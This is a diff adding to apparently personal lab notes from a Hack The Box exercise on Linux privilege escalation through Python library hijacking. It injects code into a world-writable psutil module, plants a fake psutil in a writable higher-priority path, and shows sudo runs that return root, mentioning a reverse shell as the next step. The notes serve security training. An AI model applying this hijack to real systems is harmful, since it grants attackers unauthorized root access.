@@ -197,3 +197,101 @@ htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist
 htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
 -rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
 ```
+
+Content of the module:
+
+```python
+...SNIP...
+def virtual_memory():
+	...SNIP...
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+...SNIP...
+```
+
+This is the part in the library where we can insert our code.
+
+we can insert the command `id` and check during the execution of the script if the inserted code is executed.
+
+```python
+...SNIP...
+def virtual_memory():
+	...SNIP...
+	#### Hijacking
+	import os
+	os.system('id')
+	
+
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+...SNIP...
+```
+
+```shell-session
+htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py
+
+uid=0(root) gid=0(root) groups=0(root)
+uid=0(root) gid=0(root) groups=0(root)
+Available memory: 79.22%
+```
+
+So now we can  insert a reverse shell that connects to our host as `root`.
+
+### Library Path
+
+&#x20;The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
+
+```shell-session
+htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'
+/usr/lib/python38.zip
+/usr/lib/python3.8
+<SNIP>
+```
+
+To be able to use this variant, two prerequisites are necessary.
+
+1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
+2. We must have write permissions to one of the paths having a higher priority on the list.
+
+Our goal is that Python accesses the first hit it finds and imports it before reaching the original and intended module.
+
+earlier we saw that `psutil` module was imported into the `mem_status.py` script. This is how We can see `psutil`'s default installation location
+
+```shell-session
+htb-student@lpenix:~$ pip3 show psutil
+Location: /usr/local/lib/python3.8/dist-packages
+```
+
+Now we can start to  see if there might be any misconfigurations in the environment to allow us `write` access to any of them.
+
+```shell-session
+htb-student@lpenix:~$ ls -la /usr/lib/python3.8
+
+drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
+```
+
+&#x20;`/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.
+
+```python
+#!/usr/bin/env python3
+import os
+def virtual_memory():
+    os.system('id')
+```
+
+and if once again we run the `mem_status.py` script using `sudo` like in the previous example.
+
+```shell-session
+htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### PYTHONPATH Environment Variable
+
+\
